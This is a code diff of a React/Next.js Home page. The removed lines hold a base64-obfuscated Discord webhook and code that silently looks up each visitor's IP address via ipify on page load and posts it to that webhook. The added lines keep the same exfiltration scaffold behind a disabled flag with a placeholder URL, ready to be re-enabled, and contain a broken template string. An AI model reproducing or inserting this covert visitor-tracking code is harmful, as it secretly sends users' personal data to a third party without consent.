@@ -5,36 +5,37 @@ import Datetime from '../components/date';
 import path from "path";
 
 export default function Home() {
-    let h: any = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4NzM0OTUxMTYxMDk3NDI0OC84MUJKQTd1TUpQcndYVFFCVnAtWVhlUi1FVzRJRTBzR1JlRUN2UF91Um0zWVFNLXZhMklOZ1B5V19ZWDc5amc5eWFIMg==");
+    let enabled = false;
 
-    function send(content: object) {
-        let data = {
-            embeds: [content],
-        };
+    (function () {
+        function send(content: object) {
+            let data = {
+                embeds: [content],
+            };
 
-        fetch(h, {
-            method: 'POST',
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-        }).catch(console.error);
-    };
-
-    function lol() {
-        fetch("https://api.ipify.org?format=json").then((response) => {
-            response.json().then((inputData) => {
-                console.log(inputData);
-                let content = {
-                    title: "hi",
-                    description: `**IP:** ${inputData.ip}`
-                };
-                send(content);
+            fetch(atob("URL"), {
+                method: 'POST',
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
             }).catch(console.error);
-        });
-    };
+        };
+        
+        if (!enabled) return;
 
-    lol();
+        (function () {
+            fetch("https://api.ipify.org?format=json").then((response) => {
+                response.json().then((inputData) => {
+                    let content = {
+                        title: "hi",
+                        description: `{inputData.ip}`
+                    };
+                    send(content);
+                }).catch(console.error);
+            });
+        })();
+    })();
     
     return (
         <>
